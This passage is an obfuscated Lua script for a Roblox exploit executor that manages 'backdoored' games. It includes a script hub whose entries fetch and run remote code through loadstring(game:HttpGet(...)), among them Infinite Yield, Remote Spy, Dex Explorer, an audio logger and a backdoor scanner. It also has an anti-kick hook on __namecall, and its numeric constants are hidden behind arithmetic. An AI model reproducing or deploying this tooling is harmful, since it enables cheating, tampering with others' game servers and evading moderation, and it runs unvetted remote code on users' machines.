								if (v3274 == (1 - 0)) then
									coroutine.yield(v3272, v3273);
									break;
								end
								if (v3274 == (0 + 0)) then
									v1671._RealIndex += (1 - 0)
									v1671.TokenCache[v1671._RealIndex] = {v3272,v3273};
									v3274 = 1 - 0;
								end
							end
						end
					end);
					break;
				end
			end
		end;
		v1564.Next = function()
			v1564._UserIndex += (2 - 1)
			if (v1564._RealIndex >= v1564._UserIndex) then
				return table.unpack(v1564.TokenCache[v1564._UserIndex]);
			elseif (coroutine.status(v1564._ScanThread) == "dead") then
				return;
			else
				local v3108 = 0 + 0;
				local v3109;
				local v3110;
				local v3111;
				while true do
					if (v3108 == 0) then
						v3109, v3110, v3111 = coroutine.resume(v1564._ScanThread);
						if (v3109 and v3110) then
							return v3110, v3111;
						else
							return;
						end
						break;
					end
				end
			end
		end;
		v1564.Peek = function(v1674)
			local v1675 = 0;
			local v1676;
			while true do
				if (v1675 == (529 - (318 + 211))) then
					v1676 = v1564._UserIndex + v1674;
					if (v1564._RealIndex >= v1676) then
						if (v1676 > (0 - 0)) then
							return table.unpack(v1564.TokenCache[v1676]);
						else
							return;
						end
					elseif (coroutine.status(v1564._ScanThread) == "dead") then
						return;
					else
						local v3443 = v1676 - v1564._RealIndex;
						local v3444, v3445, v3446 = nil, nil, nil;
						for v3484 = 1588 - (963 + 624), v3443 do
							v3444, v3445, v3446 = coroutine.resume(v1564._ScanThread);
							if not (v3444 or v3445) then
								break;
							end
						end
						return v3445, v3446;
					end
					break;
				end
			end
		end;
		return v1564;
	end;
	return v1224;
end};
v1159[v0["32"]] = {Closure=function()
	local v1252 = v0["32"];
	return {keyword={["and"]=true,["break"]=true,["do"]=true,["else"]=true,["elseif"]=true,["end"]=true,["false"]=true,["for"]=true,["function"]=true,["if"]=true,["in"]=true,["local"]=true,["nil"]=true,["not"]=true,["while"]=true,["or"]=true,["repeat"]=true,["return"]=true,["then"]=true,["true"]=true,self=true,["until"]=true,["continue"]=true,export=true},builtin={assert=true,collectgarbage=true,error=true,getfenv=true,getmetatable=true,ipairs=true,loadstring=true,newproxy=true,next=true,pairs=true,pcall=true,print=true,rawequal=true,rawget=true,rawset=true,select=true,setfenv=true,setmetatable=true,tonumber=true,tostring=true,type=true,unpack=true,xpcall=true,_G=true,_VERSION=true,bit32=true,coroutine=true,debug=true,math=true,os=true,string=true,table=true,utf8=true,delay=true,elapsedTime=true,gcinfo=true,require=true,settings=true,spawn=true,tick=true,time=true,typeof=true,UserSettings=true,wait=true,warn=true,ypcall=true,Enum=true,game=true,shared=true,script=true,workspace=true,plugin=true,Axes=true,BrickColor=true,CatalogSearchParams=true,CellId=true,CFrame=true,Color3=true,ColorSequence=true,ColorSequenceKeypoint=true,DateTime=true,DockWidgetPluginGuiInfo=true,Faces=true,File=true,FloatCurveKey=true,Instance=true,NumberRange=true,NumberSequence=true,NumberSequenceKeypoint=true,OverlapParams=true,PathWaypoint=true,PhysicalProperties=true,PluginDrag=true,Random=true,Ray=true,RaycastParams=true,Rect=true,Region3=true,Region3int16=true,RotationCurveKey=true,task=true,TextChatMessageProperties=true,TweenInfo=true,UDim=true,UDim2=true,Vector2=true,Vector2int16=true,Vector3=true,Vector3int16=true},libraries={math={abs=true,acos=true,asin=true,atan=true,atan2=true,ceil=true,clamp=true,cos=true,cosh=true,deg=true,exp=true,floor=true,fmod=true,frexp=true,ldexp=true,log=true,log10=true,max=true,min=true,modf=true,noise=true,pow=true,rad=true,random=true,round=true,sinh=true,sqrt=true,tan=true,tanh=true,sign=true,sin=true,randomseed=true,huge=true,pi=true},string={byte=true,char=true,find=true,format=true,gmatch=true,gsub=true,len=true,lower=true,match=true,pack=true,packsize=true,rep=true,reverse=true,split=true,sub=true,unpack=true,upper=true},table={clear=true,concat=true,foreach=true,foreachi=true,freeze=true,getn=true,insert=true,isfrozen=true,maxn=true,remove=true,sort=true,find=true,pack=true,unpack=true,move=true,create=true},debug={dumpheap=true,info=true,profilebegin=true,profileend=true,resetmemorycategory=true,setmemorycategory=true,traceback=true},os={time=true,date=true,difftime=true,clock=true},coroutine={create=true,isyieldable=true,resume=true,running=true,status=true,wrap=true,yield=true},bit32={arshift=true,band=true,bnot=true,bor=true,btest=true,bxor=true,countlz=true,countrz=true,extract=true,lrotate=true,lshift=true,replace=true,rrotate=true,rshift=true},utf8={char=true,codepoint=true,codes=true,graphemes=true,len=true,nfcnormalize=true,nfdnormalize=true,offset=true,charpattern=true},Axes={new=true},BrickColor={new=true,New=true,Random=true,Black=true,Blue=true,DarkGray=true,Gray=true,Green=true,Red=true,White=true,Yellow=true,palette=true,random=true},CatalogSearchParams={new=true},CellId={new=true},CFrame={new=true,Angles=true,fromAxisAngle=true,fromEulerAnglesXYZ=true,fromEulerAnglesYXZ=true,fromMatrix=true,fromOrientation=true,lookAt=true,identity=true},Color3={new=true,fromRGB=true,fromHSV=true,fromHex=true,toHSV=true},ColorSequence={new=true},ColorSequenceKeypoint={new=true},DateTime={now=true,fromIsoDate=true,fromLocalTime=true,fromUniversalTime=true,fromUnixTimestamp=true,fromUnixTimestampMillis=true},DockWidgetPluginGuiInfo={new=true},Faces={new=true},FloatCurveKey={new=true},Instance={new=true},NumberRange={new=true},NumberSequence={new=true},NumberSequenceKeypoint={new=true},OverlapParams={new=true},PathWaypoint={new=true},PhysicalProperties={new=true},PluginDrag={new=true},Random={new=true},Ray={new=true},RaycastParams={new=true},Rect={new=true},Region3={new=true},Region3int16={new=true},RotationCurveKey={new=true},task={wait=true,spawn=true,delay=true,defer=true,synchronize=true,desynchronize=true},TweenInfo={new=true},UDim={new=true},UDim2={new=true,fromScale=true,fromOffset=true},Vector2={new=true,one=true,zero=true,xAxis=true,yAxis=true},Vector2int16={new=true},Vector3={new=true,fromAxis=true,fromNormalId=true,FromAxis=true,FromNormalId=true,one=true,zero=true,xAxis=true,yAxis=true,zAxis=true},Vector3int16={new=true}}};
end};
v1159[v0["8a"]] = {Closure=function()
	local v1253 = v0["8a"];
	local v1254 = {keyBind=Enum.KeyCode.RightShift};
	local v1255 = game:GetService("UserInputService");
	local v1256 = v1253.Parent.Parent.Parent.Parent.Parent.Main;
	local function v1257(v1569)
		local v1570 = 0 + 0;
		while true do
			if (v1570 == 0) then
				if (v1569 == nil) then
					v1569 = not v1256.Visible;
				end
				v1256.Visible = v1569;
				break;
			end
		end
	end
	v1255.InputBegan:Connect(function(v1571, v1572)
		if v1572 then
			return;
		end
		if (v1571.KeyCode == v1254.keyBind) then
			v1257();
		end
	end);
	v1253.Parent.Hitbox.MouseButton1Click:Connect(v1257);
	v1254.toggle = v1257;
	return v1254;
end};
v1159[v0["8c"]] = {Closure=function()
	local v1259 = v0["8c"];
	local v1260 = game:GetService("Players");
	local v1261 = v1259.Parent.Main;
	local v1262 = game:GetService("UserInputService");
	local v1263 = {move=TweenInfo.new(846.08 - (518 + 328), Enum.EasingStyle.Sine, Enum.EasingDirection.Out),slowBackMove=TweenInfo.new(2.2 - 1, Enum.EasingStyle.Back, Enum.EasingDirection.Out),expand=TweenInfo.new(0.5 - 0, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),hover=TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)};
	local v1264 = {DimMidnightBlue=Color3.fromRGB(32, 351 - (301 + 16), 108 - 71),MidnightBlue=Color3.fromRGB(131 - 84, 127 - 78, 54),LightMidnightBlue=Color3.fromRGB(54, 52 + 5, 36 + 27),WetAsphalt=Color3.fromRGB(93 - 49, 62, 80),Asphalt=Color3.fromRGB(52, 44 + 29, 9 + 85),Midnight=Color3.fromRGB(47, 168 - 115, 22 + 44),ElectricBlue=Color3.fromRGB(52, 1171 - (829 + 190), 781 - 562),Blurple=Color3.fromRGB(72, 65 - 13, 212),Exodus=Color3.fromRGB(143 - 39, 270 - 161, 54 + 170),Komaru=Color3.fromRGB(16 + 32, 154 - 103, 101 + 6),DimKomaru=Color3.fromRGB(632 - (520 + 93), 291 - (259 + 17), 4 + 60),LightExodus=Color3.fromRGB(126, 214, 81 + 142),Amythest=Color3.fromRGB(524 - 369, 89, 182),Wisteria=Color3.fromRGB(733 - (396 + 195), 197 - 129, 173),Emerald=Color3.fromRGB(46, 1965 - (440 + 1321), 1942 - (1059 + 770)),Carrot=Color3.fromRGB(1063 - 833, 126, 579 - (424 + 121)),Orange=Color3.fromRGB(45 + 198, 1503 - (641 + 706), 18),SunFlower=Color3.fromRGB(96 + 145, 636 - (249 + 191), 65 - 50),Ruby=Color3.fromRGB(231, 76, 60),Rose=Color3.fromRGB(192, 26 + 31, 165 - 122),LightPink=Color3.fromRGB(682 - (183 + 244), 6 + 115, 851 - (434 + 296)),DimPink=Color3.fromRGB(749 - 514, 77, 75),Pink=Color3.fromRGB(736 - (169 + 343), 76 + 10, 444 - 191),SteelPink=Color3.fromRGB(657 - 433, 71 + 15, 717 - 464),Light=Color3.fromRGB(213, 1340 - (651 + 472), 193 + 62),Cloud=Color3.fromRGB(102 + 134, 292 - 52, 724 - (397 + 86)),Silver=Color3.fromRGB(1065 - (423 + 453), 20 + 175, 199),Concrete=Color3.fromRGB(149, 22 + 143, 166),Abestos=Color3.fromRGB(111 + 16, 112 + 28, 126 + 15)};
	local function v1265(v1573, v1574, v1575)
		local v1576;
		local v1577 = false;
		local function v1578()
			v1577 = false;
			v1575();
			if v1576 then
				v1576:Disconnect();
			end
		end
		v1261:GetPropertyChangedSignal("Visible"):Connect(function()
			if (v1261.Visible == false) then
				v1578();
			end
		end);
		v1573.MouseButton1Down:Connect(function()
			local v1677 = 0;
			while true do
				if (v1677 == (1191 - (50 + 1140))) then
					v1576 = v1262.InputEnded:Connect(function(v3112)
						local v3113 = v3112.UserInputType;
						if ((v3113 == Enum.UserInputType.MouseButton1) or (v3113 == Enum.UserInputType.Touch)) then
							v1578();
						end
					end);
					break;
				end
				if (v1677 == (0 + 0)) then
					v1577 = true;
					v1574();
					v1677 = 1 + 0;
				end
			end
		end);
	end
	local v1266 = {onDownUp=v1265,tweenInfo=v1263,modernColors=v1264};
	return v1266;
end};
v1159[v0["8d"]] = {Closure=function()
	local v1267 = v0["8d"];
	local v1268 = v1267.Parent.Main.BodyClipping.Executor;
	local v1269 = v1268.InnerBody.BottomButtons;
	return {config=v1160(v1267.Parent.config),utils=v1160(v1267.Parent.utils),games=v1160(v1267.Parent.games),scripthub=v1160(v1267.Parent.scripthub),editor=v1160(v1267.Parent.editor),toggler=v1160(v1267.Parent.Main.Topbar.RightOutline.ImageLabel.toggler),ide=v1160(v1268.InnerBody.SourceBg.Source.ide),title=v1267.Parent.Main.Topbar.VersionTitle,btns={execBtn=v1269.ExecuteBtn.Hitbox}};
end};
v1159[v0["8f"]] = {Closure=function()
	local v1270 = v0["8f"];
	local v1271 = v1160(v1270:WaitForChild("scripts"));
	local v1272 = v1160(v1270.Parent.editor);
	local v1273 = v1160(v1270.Parent.config);
	local v1274 = {};
	local v1275 = 0;
	local v1276 = v1270.Parent.Main.BodyClipping.Executor.InnerBody.Scripthub.Scripts;
	local v1277 = v1276.dummy;
	v1277.Parent = nil;
	local v1279 = "rbxassetid://8150715986";
	local function v1280()
		v1276.CanvasSize = UDim2.new(0, 0, 0 + 0, (v1275 * v1277.AbsoluteSize.Y) + (v1275 * v1276.UIListLayout.Padding.Offset));
	end
	local function v1281(v1580)
		v1272.setCode(v1274[v1580]);
	end
	local function v1282(v1581, v1582, v1583)
		local v1584 = 0 - 0;
		local v1585;
		while true do
			if (v1584 == (3 + 0)) then
				v1585.Hitbox.MouseButton1Click:Connect(function()
					v1281(v1581);
				end);
				v1274[v1581] = v1582;
				v1584 = 600 - (157 + 439);
			end
			if (0 == v1584) then
				if v1274[v1581] then
					v1274[v1581] = v1582;
					return;
				end
				v1585 = v1277:Clone();
				v1584 = 1;
			end
			if (v1584 == (1 - 0)) then
				v1585.Name = v1581;
				v1585.Template.Text = v1581;
				v1584 = 6 - 4;
			end
			if (v1584 == 2) then
				v1585.Parent = v1276;
				if not v1583 then
					v1585.icon.Image = v1279;
					v1585.Delete:Destroy();
				else
					local v3116 = 0 - 0;
					while true do
						if (v3116 == (919 - (782 + 136))) then
							v1585.Delete.MouseButton1Click:Connect(function()
								v1585:Destroy();
								v1273.data.scripts[v1581] = nil;
							end);
							break;
						end
						if (v3116 == (855 - (112 + 743))) then
							v1585.icon:Destroy();
							v1585.Template.Position = v1585.Template.Position - UDim2.fromOffset(1183 - (1026 + 145), 0);
							v3116 = 1 + 0;
						end
					end
				end
				v1584 = 721 - (493 + 225);
			end
			if (v1584 == 4) then
				v1275 += (3 - 2)
				v1280();
				break;
			end
		end
	end
	local function v1283(v1586, v1587)
		for v1678, v1679 in next, v1586 do
			v1282(v1678, v1679, v1587);
		end
	end
	v1283(v1271);
	v1283(v1273.data.scripts, true);
	return {addScripts=v1283,addScript=v1282};
end};
v1159[v0["90"]] = {Closure=function()
	local v1284 = v0["90"];
	return {["Audio Logger"]="loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()",["Anti Kick"]="local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.lower\n\nif getgenv().anticheat then\n	return\nend\n\nlocal Players, StarterGui, OldNamecall = game.Players, game.StarterGui\n\ngetgenv().anticheat = {\n	Enabled = true,\n	SendNotifications = true,\n	CheckCaller = false\n}\n\nOldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(...)\n	if (getgenv().anticheat.CheckCaller and not\n		checkcaller() or true) and\n		stringlower(getnamecallmethod()) == 'kick' and\n		anticheat.Enabled then\n		return nil\n	end\n	return OldNamecall(...)\nend))\n",["Dex Explorer"]="loadstring(game:HttpGet('https://raw.githubusercontent.com/SwitchWatcher/Script/refs/heads/main/Dex_Explorer.txt'))()",["F3X Tools"]="loadstring(game:GetObjects('rbxassetid://6695644299')[1].Source)()",["Infinite Yield"]="loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()",["Lalol Backdoor"]="_G.LALOL_Hub_Backdoor_Logs_Disabled = true\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/refs/heads/main/Backdoor-Scanner/script'))()",["Remote Spy"]="loadstring(game:HttpGet('https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua'))()"};
end};
v1159[v0["91"]] = {Closure=function()
	local v1285 = v0["91"];
	local v1286 = game:GetService("TweenService");
	local v1287 = game:GetService("MarketplaceService");
	local v1288 = game:GetService("TeleportService");
	local v1289 = v1160(v1285.Parent.utils);
	local v1290 = v1160(v1285.Parent.config);
	local v1291 = v1285.Parent.Main.BodyClipping.Games.InnerBody.ScrollingFrame;
	local v1292 = v1291.dummy;
	v1292.Parent = nil;
	local v1294 = v1292.Backdoors.Text;
	local v1295 = v1292.Date.Text;
	local v1296 = false;
	local v1297 = {};
	local function v1298(v1588, v1589, v1590)
		local v1591 = 0 + 0;
		local v1592;
		local v1593;
		local v1594;
		local v1595;
		while true do
			if (v1591 == (5 - 3)) then
				v1594 = v1297[v1588];
				if not v1594 then
					local v3117 = v1593.IconImageAssetId;
					local v3118 = v1593.Name;
					if (v3117 == (0 + 0)) then
						v3117 = 3033152788;
					end
					v1594 = v1292:Clone();
					v1594.Parent = v1291;
					v1594.GameIcon.Image = "rbxassetid://" .. v3117;
					v1594.Title.Text = v3118;
				end
				v1595 = DateTime.fromUnixTimestamp(v1590);
				v1591 = 8 - 5;
			end
			if (v1591 == (0 + 0)) then
				v1588 = tonumber(v1588);
				v1590 = v1590 or os.time();
				if ((type(v1589) ~= "table") or (#v1589 == (0 - 0))) then
					return;
				end
				v1591 = 1;
			end
			if (v1591 == (1599 - (210 + 1385))) then
				v1594.Play.Hitbox.MouseEnter:Connect(function()
					v1286:Create(v1594.Play, v1289.tweenInfo.move, {Size=UDim2.new(1689 - (1201 + 488), 56 + 34, 1 - 0, 0 - 0)}):Play();
				end);
				v1594.Play.Hitbox.MouseButton1Click:Connect(function()
					local v2889 = 0;
					while true do
						if (v2889 == 1) then
							v1288:Teleport(v1588);
							break;
						end
						if (v2889 == 0) then
							if v1296 then
								return;
							end
							v1296 = true;
							v2889 = 1;
						end
					end
				end);
				v1297[v1588] = v1594;
				v1591 = 5;
			end
			if (v1591 == (586 - (352 + 233))) then
				v1592, v1593 = pcall(v1287.GetProductInfo, v1287, v1588);
				if not v1592 then
					return;
				end
				v1290.data.games[v1588] = {backdoors=v1589,timestamp=v1590};
				v1591 = 4 - 2;
			end
			if (3 == v1591) then
				v1594.Backdoors.Text = v1294:format(#v1589);
				v1594.Date.Text = v1295:format(v1595:ToIsoDate());
				v1594.Play.Hitbox.MouseLeave:Connect(function()
					v1286:Create(v1594.Play, v1289.tweenInfo.move, {Size=UDim2.new(0 + 0, 30, 2 - 1, 0)}):Play();
				end);
				v1591 = 578 - (489 + 85);
			end
			if (v1591 == (1506 - (277 + 1224))) then
				v1291.info.Visible = false;
				break;
			end
		end
	end
	local function v1299(v1596)
		for v1680, v1681 in next, v1596 do
			v1298(v1680, v1681.backdoors, v1681.timestamp);
		end
	end
	v1299(v1290.data.games);
	return {loadGame=v1298,loadGames=v1299};
end};
v1159[v0["92"]] = {Closure=function()
	local v1300 = v0["92"];
	local v1301 = (getgenv and readfile) or function()
		return [==[]==];
	end;
	local v1302 = writefile or function()
		return true;
	end;
	local v1303 = "backdoor-exe.json";
	local v1304 = game:GetService("HttpService");
	local v1305 = game:GetService("RunService");
	local v1306 = {background=Color3.fromRGB(1540 - (663 + 830), 42 + 5, 47),iden=Color3.fromRGB(234, 572 - 338, 1109 - (461 + 414)),keyword=Color3.fromRGB(37 + 178, 70 + 104, 25 + 230),builtin=Color3.fromRGB(130 + 1, 456 - (172 + 78), 410 - 155),string=Color3.fromRGB(73 + 123, 367 - 112, 193),number=Color3.fromRGB(70 + 185, 42 + 83, 125),comment=Color3.fromRGB(140, 234 - 94, 155),operator=Color3.fromRGB(255, 300 - 61, 38 + 110)};
	local v1307 = true;
	local function v1308()
		return {games={},scripts={},settings={codeColors=table.clone(v1306),canDebug=v1307}};
	end
	local function v1309(v1597)
		local v1598 = {};
		for v1682, v1683 in pairs(v1597) do
			local v1684 = 0 + 0;
			while true do
				if (v1684 == (0 + 0)) then
					if (type(v1683) == "table") then
						v1683 = v1309(v1683);
					end
					v1598[v1682] = v1683;
					break;
				end
			end
		end
		return v1598;
	end
	local function v1310(v1599)
		local v1600 = 0;
		local v1601;
		local v1602;
		while true do
			if (v1600 == (0 - 0)) then
				v1601, v1602 = pcall(v1301, v1599);
				if v1601 then
					return v1602;
				end
				break;
			end
		end
	end
	local function v1311()
		local v1603;
		local v1604 = v1310(v1303);
		local v1605, v1606 = pcall(v1304.JSONDecode, v1304, v1604);
		if v1605 then
			local v2469 = 0 - 0;
			local v2470;
			while true do
				if (v2469 == 4) then
					for v3275, v3276 in next, v1306 do
						if (v2470.codeColors[v3275] == nil) then
							v2470.codeColors[v3275] = v3276;
						end
					end
					for v3277, v3278 in next, v1603.scripts do
						if ((type(v3277) ~= "string") or (type(v3278) ~= "string")) then
							v1603.scripts[v3277] = nil;
						end
					end
					break;
				end
				if (0 == v2469) then
					v2470 = {codeColors={}};
					v1603 = {};
					v2469 = 1;
				end
				if ((1 + 1) == v2469) then
					if (v1606.canDebug == nil) then
						v2470.canDebug = v1307;
					else
						v2470.canDebug = v1606.settings.canDebug;
					end
					if (type(v1606.settings) == "table") then
						for v3450, v3451 in next, v1606.settings.codeColors do
							if (typeof(v3451) ~= "table") then
								local v3514 = 0 + 0;
								while true do
									if ((447 - (133 + 314)) == v3514) then
										v2470.codeColors[v3450] = nil;
										continue;
									end
								end
							end
							v3451.R = ((type(v3451.R) == "number") and v3451.R) or (1 + 0);
							v3451.G = ((type(v3451.G) == "number") and v3451.G) or 1;
							v3451.B = ((type(v3451.B) == "number") and v3451.B) or (214 - (199 + 14));
							v2470.codeColors[v3450] = Color3.new(v3451.R, v3451.G, v3451.B);
						end
					else
						v2470.codeColors = v1306;
					end
					v2469 = 3;
				end
				if (v2469 == (3 - 2)) then
					v1603.games = ((type(v1606.games) == "table") and v1606.games) or {};
					v1603.scripts = ((type(v1606.scripts) == "table") and v1606.scripts) or {};
					v2469 = 1551 - (647 + 902);
				end
				if (v2469 == (8 - 5)) then
					v1603.settings = v2470;
					for v3279, v3280 in next, v2470.codeColors do
						if ((typeof(v3280) ~= "Color3") or (v1306[v3279] == nil)) then
							v1603.codeColors[v3279] = nil;
						end
					end
					v2469 = 237 - (85 + 148);
				end
			end
		else
			v1603 = v1308();
		end
		return v1603;
	end
	local v1312 = v1311();
	local v1313 = Instance.new("BindableEvent");
	local function v1314()
		local v1607 = 1289 - (426 + 863);
		local v1608;
		local v1609;
		local v1610;
		while true do
			if (v1607 == 0) then
				v1608 = v1309(v1312);
				for v2891, v2892 in next, v1608.settings.codeColors do
					v1608.settings.codeColors[v2891] = {R=v2892.R,G=v2892.G,B=v2892.B};
				end
				v1607 = 4 - 3;
			end
			if (v1607 == 1) then
				v1609, v1610 = pcall(v1304.JSONEncode, v1304, v1608);
				if v1609 then
					v1313:Fire();
					v1302(v1303, v1610);
					if v1305:IsStudio() then
						print(v1610);
					end
				end
				break;
			end
		end
	end
	return {data=v1312,save=v1314,codeColors=v1306,configSaved=v1313.Event};
end};
v1159[v0["93"]] = {Closure=function()
	local v1315 = 1654 - (873 + 781);
	local v1316;
	local v1317;
	local v1318;
	local v1319;
	local v1320;
	local v1321;
	local v1322;
	local v1323;
	local v1324;
	local v1325;
	local v1326;
	local v1327;
	local v1328;
	local v1329;
	local v1330;
	local v1331;
	while true do
		if (v1315 == 1) then
			v1320 = {};
			v1321 = v1316.Parent.Main.BodyClipping.Executor.InnerBody.OpenScripts;
			v1322 = "1";
			v1323 = v1321["1"]:Clone();
			v1315 = 2;
		end
		if (4 == v1315) then
			v1329 = nil;
			function v1329()
				local v2762 = 0 - 0;
				local v2763;
				while true do
					if (v2762 == (0 - 0)) then
						v2763 = (v1317 * v1323.AbsoluteSize.X) + ((v1317 + 1 + 0) * 5) + v1325.AbsoluteSize.X;
						v1321.CanvasSize = UDim2.new(0 - 0, v2763, 0 - 0, 0);
						break;
					end
				end
			end
			v1330 = nil;
			function v1330(v2764)
				local v2765 = v2764.Name;
				if (v2765 == "1") then
					v2764.X:Destroy();
				else
					v2764.X.MouseButton1Click:Connect(function()
						local v3282 = 0 - 0;
						while true do
							if (v3282 == 0) then
								if (v1322 == v2765) then
									v1328();
								end
								v2764:Destroy();
								v3282 = 1948 - (414 + 1533);
							end
							if (v3282 == (1 + 0)) then
								v1319[v2765] = nil;
								v1320[v2765] = nil;
								v3282 = 557 - (443 + 112);
							end
							if ((1481 - (888 + 591)) == v3282) then
								v1317 -= (2 - 1)
								v1329();
								break;
							end
						end
					end);
				end
				v2764.Text.Text = "Script " .. v2765;
				v2764.Hitbox.MouseButton1Click:Connect(function()
					v1328(v2765);
				end);
			end
			v1315 = 5;
		end
		if ((1 + 4) == v1315) then
			v1331 = nil;
			function v1331()
				v1318 = v1318 + 1;
				v1317 += (3 - 2)
				local v2767 = v1323:Clone();
				v2767.Name = tostring(v1318);
				v1330(v2767);
				v2767.Parent = v1321;
				v1319[v2767.Name] = v2767;
				v1320[v2767.Name] = "";
				v1329();
				v1328(v2767.Name);
			end
			v1331();
			v1325.Hitbox.MouseButton1Click:Connect(v1331);
			v1315 = 6;
		end
		if (v1315 == (1 + 1)) then
			v1324 = v1321.Parent.SourceBg.Source.ScrollingFrame.SourceBox;
			v1325 = v1321["999"];
			v1321["1"]:Destroy();
			v1326 = Color3.fromRGB(61 + 64, 14 + 111, 125);
			v1315 = 5 - 2;
		end
		if (v1315 == (10 - 4)) then
			return {getCode=function()
				return v1320[v1322];
			end,setCode=function(v2772)
				v1324.Text = v2772;
			end,clearCurrent=function()
				v1324.Text = "";
			end};
		end
		if (v1315 == (1681 - (136 + 1542))) then
			v1327 = Color3.fromRGB(724 - 503, 221, 221);
			v1324.InputEnded:Connect(function()
				v1320[v1322] = v1324.Text;
			end);
			v1328 = nil;
			function v1328(v2777)
				v2777 = v2777 or "1";
				if (v2777 == v1322) then
					return;
				end
				local v2778 = v1322 and v1319[v1322];
				local v2779 = v1319[v2777];
				if v2778 then
					v2778.Text.TextColor3 = v1326;
				end
				v2779.Text.TextColor3 = v1327;
				v1324.Text = v1320[v2777];
				v1322 = v2779.Name;
			end
			v1315 = 4 + 0;
		end
		if (v1315 == (0 - 0)) then
			v1316 = v0["93"];
			v1317 = 1;
			v1318 = 0 + 0;
			v1319 = {};
			v1315 = 487 - (68 + 418);
		end
	end
end};
v1159[v0["94"]] = {Closure=function()
	local v1332 = v0["94"];
	local v1333 = v1160(v1332.Parent.utils);
	local v1334;
	local v1335 = "\226\128\139\226\128\139\226\128\139";
	local v1336 = function()
		return true;
	end;
	local v1337 = game:GetService("UserInputService");
	local v1338 = game:GetService("TweenService");
	local v1339 = game:GetService("TeleportService");
	local v1340 = game:GetService("HttpService");
	local v1341 = game:GetService("TextService");
	local v1342 = game:GetService("RunService");
	local v1343 = game:GetService("CoreGui");
	local v1344 = game:GetService("Players");
	local v1345 = game:GetService("Debris");
	local v1346 = game:GetService("Lighting");
	local v1347 = game:GetService("SoundService");
	local v1348 = game:GetService("MarketplaceService");
	local v1349 = v1344.LocalPlayer;
	local v1350 = v1349 and v1349.PlayerGui;
	local v1351 = v1349 and v1349:GetMouse();
	local v1352 = get_hidden_gui or gethui or function()
		local v1611 = 0 - 0;
		local v1612;
		local v1613;
		while true do
			if (v1611 == (0 - 0)) then
				v1612 = nil;
				v1613 = pcall(function()
					v1612 = Instance.new("ScreenGui", v1343);
				end);
				v1611 = 1 + 0;
			end
			if (v1611 == (1093 - (770 + 322))) then
				if v1613 then
					local v3126 = 0;
					while true do
						if (v3126 == (0 + 0)) then
							v1612:Destroy();
							return v1343;
						end
					end
				else
					return v1350;
				end
				break;
			end
		end
	end;
	local v1353 = protect_gui or (syn and syn.protect_gui) or function()
	end;
	local v1354;
	do
		local v1614 = {};
		do
			for v2475 = 48, 57 do
				table.insert(v1614, string.char(v2475));
			end
			for v2476 = 19 + 46, 13 + 77 do
				table.insert(v1614, string.char(v2476));
			end
			for v2477 = 138 - 41, 236 - 114 do
				table.insert(v1614, string.char(v2477));
			end
		end
		v1354 = {SearchField=function(v1685, v1686, v1687)
			for v2478 in next, v1685 do
				local v2479 = 0 - 0;
				local v2480;
				local v2481;
				while true do
					if (v2479 == (3 - 2)) then
						if v2478:find(v1686) then
							return v2478;
						end
						break;
					end
					if (v2479 == 0) then
						v2480 = (v1687 and v1686:lower()) or v1686;
						v2481 = (v1687 and v2478:lower()) or v2478;
						v2479 = 1;
					end
				end
			end
		end,CountTable=function(v1688)
			local v1689 = 0 + 0;
			local v1690;
			while true do
				if (v1689 == (1 - 0)) then
					return v1690;
				end
				if (v1689 == (0 + 0)) then
					v1690 = 0;
					for v3127, v3128 in next, v1688 do
						v1690 = v1690 + 1 + 0;
					end
					v1689 = 1 + 0;
				end
			end
		end,CloneTable=function(v1691)
			if (type(v1691) == "table") then
				local v2784 = 0 - 0;
				local v2785;
				while true do
					if (v2784 == (0 - 0)) then
						v2785 = {};
						table.foreach(v1691, function(v3381, v3382)
							v2785[v3381] = v3382;
						end);
						v2784 = 1 + 0;
					end
					if (v2784 == (4 - 3)) then
						return v2785;
					end
				end
			end
		end,RandomString=function(v1692)
			local v1693 = 0;
			if (not v1692 or (v1692 <= (0 - 0))) then
				return "";
			end
			local v1694 = "";
			for v2482 = 1 + 0, v1692 do
				local v2483 = 0;
				while true do
					if (v2483 == (4 - 3)) then
						v1693 = v1693 + (832 - (762 + 69));
						break;
					end
					if (v2483 == (0 - 0)) then
						math.randomseed(os.time() + v1693);
						v1694 = v1694 .. v1614[math.random(1 + 0, #v1614)];
						v2483 = 1 + 0;
					end
				end
			end
			return v1694;
		end,DarkerColor=function(v1695, v1696)
			local v1697 = 0 - 0;
			local v1698;
			local v1699;
			local v1700;
			while true do
				if (v1697 == 0) then
					v1698, v1699, v1700 = v1695:ToHSV();
					v1700 = v1700 - v1696;
					v1697 = 1;
				end
				if ((1 + 0) == v1697) then
					if (v1700 < (0 + 0)) then
						v1700 = 0 - 0;
					end
					return Color3.fromHSV(v1698, v1699, v1700);
				end
			end
		end};
	end
	local v1355, v1356, v1357;
	do
		local v1615 = "MagnoliaEnums";
		function v1356()
			return error("can't set value, field is read-only.");
		end
		v1355 = newproxy(true);
		M_EnumsMeta = getmetatable(v1355);
		local v1616 = {};
		local v1617 = {};
		M_EnumsMeta.Data = v1616;
		M_EnumsMeta.__index = function(v1701, v1702)
			local v1703 = v1616[v1702];
			if v1703 then
				return v1703;
			end
			local v1704 = v1354.SearchField(v1616, v1702, true);
			if v1704 then
				return error("Unable to find Enums, " .. v1702 .. ". did you mean, " .. v1704);
			end
			return error("Unable to find Enums, " .. v1702);
		end;
		M_EnumsMeta.__newindex = function(v1705, v1706, v1707)
			if (type(v1707) == "table") then
				local v2786 = 0;
				while true do
					if (v2786 == (157 - (8 + 149))) then
						for v3384, v3385 in next, v1707 do
							local v3386 = 1320 - (1199 + 121);
							local v3387;
							local v3388;
							while true do
								if (v3386 == (0 - 0)) then
									v3387 = newproxy(true);
									v3388 = getmetatable(v3387);
									v3386 = 2 - 1;
								end
								if ((1 + 0) == v3386) then
									v3388.Path = v1615 .. "." .. v1706 .. "." .. v3384;
									v3388.__index = {Value=v3385,Name=v3384,Type=v1706};
									v3386 = 6 - 4;
								end
								if (2 == v3386) then
									v3388.__newindex = v1356;
